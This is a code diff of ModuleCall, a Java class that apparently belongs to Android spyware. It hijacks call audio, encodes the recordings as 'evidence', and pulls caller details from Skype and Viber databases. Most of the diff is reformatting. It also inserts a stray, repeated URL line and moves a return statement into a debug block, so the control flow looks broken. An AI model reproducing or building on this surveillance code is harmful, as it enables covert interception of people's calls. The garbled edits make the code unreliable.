@@ -336,31 +336,34 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (stopQueueMonitor) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(EncodingTask run): killing audio encoding thread");
+						http: // cognome.alfemminile.com/w/cognomi/304-milano/cognomi-piu-diffusi.htmlhttp://cognome.alfemminile.com/w/cognomi/304-milano/cognomi-piu-diffusi.htmlhttp://cognome.alfemminile.com/w/cognomi/304-milano/cognomi-piu-diffusi.htmlhttp://cognome.alfemminile.com/w/cognomi/304-milano/cognomi-piu-diffusi.html
+								// }
+
+						return;
 					}
 
-					return;
-				}
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
+					}
 
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
-				}
+					// Browse lists and check if an encoding is already in
+					// progress
+					try {
+						while (queue.isEmpty() == false) {
+							String file = queue.take();
 
-				// Browse lists and check if an encoding is already in progress
-				try {
-					while (queue.isEmpty() == false) {
-						String file = queue.take();
+							// Check if end of conversation
+							if (Cfg.DEBUG) {
+								Check.log(TAG + "(EncodingTask run): decoding " + file);
+							}
 
-						// Check if end of conversation
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(EncodingTask run): decoding " + file);
+							encodeChunks(file);
+
 						}
-
-						encodeChunks(file);
-
-					}
-				} catch (Exception e) {
-					if (Cfg.EXCEPTION) {
-						Check.log(e);
+					} catch (Exception e) {
+						if (Cfg.EXCEPTION) {
+							Check.log(e);
+						}
 					}
 				}
 			}
@@ -408,7 +411,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (observer != null) {
 				observer.stopWatching();
 			}
-			
+
 			if (hijack != null) {
 				hijack.stopInstrumentation();
 			}
@@ -1003,27 +1006,27 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 				return;
 			}
-			
+
 			String caller = callInfo.getCaller();
 			String callee = callInfo.getCallee();
 
-			if(callInfo.delay){
+			if (callInfo.delay) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (encodeChunks) delay, just add a chunk: " + chunks.size());
 				}
 				chunks.add(new Chunk(encodedFile, begin, end, remote));
-			}else{
+			} else {
 				// Encode to evidence
 				// TODO add caller/callee phone number and right timestamps
 				saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, remote, callInfo.programId);
 			}
-			
+
 			// We have an end of call and it's on both channels
 			if (audioEncoder.isLastCallFinished() && encodedFile.endsWith("-r.tmp.err")) {
 				// After encoding create the end of call marker
-				if(callInfo.delay){
-					saveAllEvidences(chunks, begin, end);					
-				}else{
+				if (callInfo.delay) {
+					saveAllEvidences(chunks, begin, end);
+				} else {
 					closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
 				}
 				callInfo = new CallInfo();
@@ -1047,23 +1050,24 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	private void saveAllEvidences(List<Chunk> chunks, Date begin, Date end) {
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveAllEvidences) chunks: " + chunks.size());
 		}
-		CallInfo callInfo =  new CallInfo();
+		CallInfo callInfo = new CallInfo();
 		updateCallInfo(callInfo, true);
-		
+
 		String caller = callInfo.getCaller();
 		String callee = callInfo.getCallee();
-		for (Chunk chunk: chunks){
+		for (Chunk chunk : chunks) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveAllEvidences) saving chunk: " + chunk.encodedFile);
 			}
-			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.remote, callInfo.programId);
-			
+			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.remote,
+					callInfo.programId);
+
 		}
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveAllEvidences) saving last chunk");
 		}
@@ -1089,7 +1093,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			callInfo.account = account;
 			callInfo.programId = 0x0146;
 			callInfo.delay = false;
-			
+
 			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
 
 			boolean ret = false;
@@ -1109,17 +1113,16 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				callInfo.account = account;
 				GenericSqliteHelper helper = ChatViber.openViberDBHelper();
 
-
 				if (helper != null) {
 					ret = ChatViber.getCurrentCall(helper, callInfo);
 				}
-				
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (updateCallInfo) id: " + callInfo.id);
 				}
-			}else{
-				callInfo.account="delay";
-				callInfo.peer="delay";
+			} else {
+				callInfo.account = "delay";
+				callInfo.peer = "delay";
 				ret = true;
 			}
 
